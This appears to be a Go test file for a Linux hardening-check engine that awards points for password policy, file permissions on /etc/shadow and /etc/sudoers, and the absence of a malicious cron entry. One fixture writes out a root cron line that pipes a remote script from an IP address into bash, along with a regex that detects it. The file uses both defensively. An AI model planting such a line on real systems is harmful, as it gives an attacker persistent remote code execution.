package checks_test

import (
	"testing"

	"github.com/roundzero/agent/internal/checks"
	"github.com/roundzero/agent/internal/system"
)

func mustParse(t *testing.T, doc string) *checks.CheckFile {
	t.Helper()
	cf, err := checks.Parse([]byte(doc))
	if err != nil {
		t.Fatalf("Parse: %v", err)
	}
	return cf
}

func runOne(t *testing.T, doc string, sys system.System) checks.Result {
	t.Helper()
	cf := mustParse(t, doc)
	results := checks.Run(cf, sys)
	if len(results) != 1 {
		t.Fatalf("expected 1 result, got %d", len(results))
	}
	return results[0]
}

func checkResults(t *testing.T, cf *checks.CheckFile, sys system.System) []checks.Result {
	t.Helper()
	return checks.Run(cf, sys)
}

const fileContainsPresentDoc = `
version: 1
image: test
checks:
  - id: pwquality-minlen
    title: pwquality enforces minlen
    skillNode: linux.pam.pwquality
    points: 10
    type: file_contains
    params:
      path: /etc/security/pwquality.conf
      pattern: 'minlen\s*=\s*1[0-9]'
      present: true
`

func TestFileContains_PresentTrue_Fails_WhenMissing(t *testing.T) {
	sys := system.NewFake()
	sys.Files["/etc/security/pwquality.conf"] = "# nothing configured\n"
	r := runOne(t, fileContainsPresentDoc, sys)
	if r.Err != nil {
		t.Fatalf("unexpected error: %v", r.Err)
	}
	if r.Pass {
		t.Fatal("expected fail: pattern absent")
	}
	if r.Earned != 0 {
		t.Fatalf("expected 0 points earned, got %d", r.Earned)
	}
}

func TestFileContains_PresentTrue_Passes_WhenFound(t *testing.T) {
	sys := system.NewFake()
	sys.Files["/etc/security/pwquality.conf"] = "minlen = 14\ndcredit = -1\n"
	r := runOne(t, fileContainsPresentDoc, sys)
	if !r.Pass {
		t.Fatalf("expected pass, detail=%q err=%v", r.Detail, r.Err)
	}
	if r.Earned != 10 {
		t.Fatalf("expected 10 points earned, got %d", r.Earned)
	}
}

func TestFileContains_PresentTrue_MissingFileCountsAsAbsent(t *testing.T) {
	sys := system.NewFake() // file never registered == absent
	r := runOne(t, fileContainsPresentDoc, sys)
	if r.Pass {
		t.Fatal("expected fail: file doesn't exist, pattern can't be present")
	}
}

const fileContainsAbsentDoc = `
version: 1
image: test
checks:
  - id: cron-malicious
    title: no malicious cron line
    skillNode: linux.services-persistence.cron
    points: 12
    type: file_contains
    params:
      path: /etc/cron.d/pkg-update
      pattern: 'curl .* \| ?bash'
      present: false
`

func TestFileContains_PresentFalse_Fails_WhenPatternFound(t *testing.T) {
	sys := system.NewFake()
	sys.Files["/etc/cron.d/pkg-update"] = "*/5 * * * * root curl -s http://198.51.100.23/x.sh | bash\n"
	r := runOne(t, fileContainsAbsentDoc, sys)
	if r.Pass {
		t.Fatal("expected fail: malicious line still present")
	}
}

func TestFileContains_PresentFalse_Passes_WhenFileDeleted(t *testing.T) {
	sys := system.NewFake() // file removed entirely as the fix
	r := runOne(t, fileContainsAbsentDoc, sys)
	if !r.Pass {
		t.Fatalf("expected pass: absent file has no matching content, detail=%q", r.Detail)
	}
}

const fileModeMaxDoc = `
version: 1
image: test
checks:
  - id: shadow-mode
    title: shadow is not world-readable
    skillNode: linux.files-perms.sensitive-modes
    points: 7
    type: file_mode
    params:
      path: /etc/shadow
      mode: "0640"
      compare: max
`

func TestFileMode_Max_Fails_WhenMorePermissive(t *testing.T) {
	sys := system.NewFake()
	sys.Modes["/etc/shadow"] = 0644
	r := runOne(t, fileModeMaxDoc, sys)
	if r.Pass {
		t.Fatal("expected fail: 0644 exceeds max 0640")
	}
}

func TestFileMode_Max_Passes_WhenEqual(t *testing.T) {
	sys := system.NewFake()
	sys.Modes["/etc/shadow"] = 0640
	r := runOne(t, fileModeMaxDoc, sys)
	if !r.Pass {
		t.Fatalf("expected pass, detail=%q", r.Detail)
	}
}

func TestFileMode_Max_Passes_WhenStricter(t *testing.T) {
	sys := system.NewFake()
	sys.Modes["/etc/shadow"] = 0600
	r := runOne(t, fileModeMaxDoc, sys)
	if !r.Pass {
		t.Fatalf("expected pass: 0600 is stricter than max 0640, detail=%q", r.Detail)
	}
}

func TestFileMode_Fails_WhenFileMissing(t *testing.T) {
	sys := system.NewFake()
	r := runOne(t, fileModeMaxDoc, sys)
	if r.Pass {
		t.Fatal("expected fail: file doesn't exist")
	}
}

const fileModeEqualsDoc = `
version: 1
image: test
checks:
  - id: sudoers-mode
    title: sudoers mode
    skillNode: linux.accounts.sudoers
    points: 5
    type: file_mode
    params:
      path: /etc/sudoers
      mode: "0440"
`

func TestFileMode_EqualsIsDefaultCompare(t *testing.T) {
	sys := system.NewFake()
	sys.Modes["/etc/sudoers"] = 0640
	r := runOne(t, fileModeEqualsDoc, sys)
	if r.Pass {
		t.Fatal("expected fail: 0640 != 0440 under default equals compare")
	}
}
